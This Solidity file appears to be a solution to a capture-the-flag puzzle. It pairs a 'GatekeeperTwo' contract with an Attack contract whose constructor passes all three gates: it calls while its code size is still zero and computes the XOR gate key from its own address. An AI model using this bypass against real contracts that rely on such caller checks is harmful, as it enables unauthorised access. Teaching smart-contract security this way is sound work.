// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin, "ORIGIN IS SENDER");
        _;
    }

    modifier gateTwo() {
        uint x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0, "CODESIZE NOT ZERO");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                type(uint64).max,
            "INVALID GATEKEY"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Attack {
    constructor(address _gatekeeperTwo) {
        bytes8 gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                type(uint64).max
        );

        GatekeeperTwo instance = GatekeeperTwo(_gatekeeperTwo);
        instance.enter(gateKey);
    }

    modifier isContract() {
        uint x;
        assembly {
            x := extcodesize(caller())
        }
        require(x != 0, "CODESIZE ZERO");
        _;
    }
}
